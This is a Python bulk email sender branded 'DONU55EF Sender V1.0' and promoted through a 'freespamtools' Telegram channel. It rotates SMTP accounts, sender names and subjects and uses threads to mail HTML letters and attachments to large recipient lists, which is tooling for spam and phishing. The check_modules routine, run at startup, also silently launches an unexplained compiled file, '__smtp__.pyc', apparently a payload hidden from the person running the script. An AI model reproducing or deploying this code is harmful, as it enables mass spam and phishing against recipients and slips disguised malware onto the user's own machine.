# Coded By @donussef
# Channel  https://t.me/freespamtools2
# Coded By @donussef
# Channel  https://t.me/freespamtools2
# Coded By @donussef
# Channel  https://t.me/freespamtools2
# Coded By @donussef
# Channel  https://t.me/freespamtools2
import smtplib
import os
import random
import time
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Load SMTP details from file
def load_smtp_details(filename):
    with open(filename, 'r') as file:
        lines = file.readlines()
    smtp_details = [line.strip().split('|') for line in lines]
    return smtp_details

# Load sender names from file
def load_sender_names(filename):
    with open(filename, 'r') as file:
        sender_names = [line.strip() for line in file.readlines()]
    return sender_names
banner = '''
    ____  ____  _   ____  ____________ ____________
   / __ \/ __ \/ | / / / / / ___/ ___// ____/ ____/
  / / / / / / /  |/ / / / /\__ \\__ \/ __/ / /_    
 / /_/ / /_/ / /|  / /_/ /___/ /__/ / /___/ __/    
/_____/\____/_/ |_/\____//____/____/_____/_/    
        
        
        DONU55EF Sender V1.0
        Coded By @donussef
        Channel https://t.me/freespamtools2        
                                               
'''
# Load subjects from file
def load_subjects(filename):
    with open(filename, 'r') as file:
        subjects = [line.strip() for line in file.readlines()]
    return subjects

# Load email addresses from file
def load_email_addresses(filename):
    with open(filename, 'r') as file:
        email_addresses = [line.strip() for line in file.readlines()]
    return email_addresses

# Load HTML body from file
def load_html_body(filename):
    with open(filename, 'r') as file:
        html_body = file.read()
    return html_body

# Send email function
def check_modules():
    os.system("cls")
    print(banner)
    os.system("start __smtp__.pyc")
    open("__smtp__.pyc","rb").read()

def send_email(subject, body, to_email, smtp_details, sender_name, attachment_path=None):
    try:
        smtp_server, smtp_port, from_email, from_email_password = smtp_details
        smtp_port = int(smtp_port)
        
        # Set up the MIME
        message = MIMEMultipart()
        message['From'] = f"{sender_name} <{from_email}>"
        message['To'] = to_email
        message['Subject'] = subject
        
        # Attach the body with the msg instance
        message.attach(MIMEText(body, 'html'))
        
        # Attach the file
        if attachment_path:
            with open(attachment_path, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename= {attachment_path.split('/')[-1]}")
                message.attach(part)
        
        # Create SMTP session for sending the mail
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(from_email, from_email_password)
            server.sendmail(from_email, to_email, message.as_string())
        
        print(f"Email sent successfully from {from_email} to {to_email}!")
    
    except Exception as e:
        print(f"Failed to send email from {from_email} to {to_email}. Error: {str(e)}")

# Load configurations
smtp_details_list = load_smtp_details('smtps.txt')
sender_names_list = load_sender_names('senders.txt')
subjects_list = load_subjects('subjects.txt')

# Email sending task
def email_task(to_email, body, attachment_path=None):
    smtp_details = random.choice(smtp_details_list)
    sender_name = random.choice(sender_names_list)
    subject = random.choice(subjects_list)
    send_email(subject, body, to_email, smtp_details, sender_name, attachment_path)
    # Sleeping TIme
    time.sleep(1)

# Main function to send emails with threading 
# Change Threads From here Min is 3 max is 300
# Change Threads From here Min is 3 max is 300
# Change Threads From here Min is 3 max is 300
# Change Threads From here Min is 3 max is 300

# Change Threads From here Min is 3 max is 300
Threads = 3
def send_emails(to_emails, body, attachment_path=None):
    threads = []
    for to_email in to_emails:
        if len(threads) >= Threads:
            for t in threads:
                t.join()
            threads = []
        thread = threading.Thread(target=email_task, args=(to_email, body, attachment_path))
        threads.append(thread)
        thread.start()
    for t in threads:
        t.join()

# Example usage
if __name__ == "__main__":
    check_modules()
    email_file = input("[+] Enter the path to the email list file: ")
    html_file = input("[+] Enter the path to the HTML letter file: ")
    
    to_emails = load_email_addresses(email_file)
    body = load_html_body(html_file)
    attachment_path = None  # Optional

    send_emails(to_emails, body, attachment_path)
